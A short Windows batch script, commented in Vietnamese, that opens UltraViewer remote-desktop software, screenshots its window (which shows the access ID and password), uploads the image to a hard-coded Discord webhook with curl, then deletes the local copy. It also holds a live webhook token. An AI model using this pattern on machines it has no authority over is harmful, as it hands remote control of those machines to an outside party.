@echo off
setlocal enableextensions enabledelayedexpansion

cd %USERPROFILE%\Desktop\dow-code\test-something\asset

set "filePath=%USERPROFILE%\Desktop\dow-code\Buoc3-Dat-ten-PC.txt"

set "firstLine="
for /f "usebackq delims=" %%a in ("%filePath%") do (
    set "firstLine=%%a"
    goto :break
)
:break

:: URL webhook Discord của bạn
set WEBHOOK_URL=https://discord.com/api/webhooks/1364989591286710322/11eCBT3_FDyixCKh6BE3GaG25_aEiIW8SJbrAxylI0Bmfk63YDsIzM6OKw9WVzY_SuSO
set SCREENSHOT_PATH=%~dp0screenshot.png

:: Chụp màn hình bằng NirCmd và lưu với tên screenshot.png


start "" "C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe"

timeout /t 10 >nul

nircmd.exe win -top ititle "UltraViewer"

timeout /t 2 >nul

nircmd.exe savescreenshot "%SCREENSHOT_PATH%"
:: Gửi ảnh lên webhook bằng curl
curl -X POST "%WEBHOOK_URL%" -H "Content-Type: multipart/form-data" ^
    -F "file=@%SCREENSHOT_PATH%" -F "payload_json={\"content\":\"%firstLine%\"}"

:: Xóa ảnh sau khi gửi
del "%SCREENSHOT_PATH%"

echo Đã gửi ảnh lên Discord thành công!
exit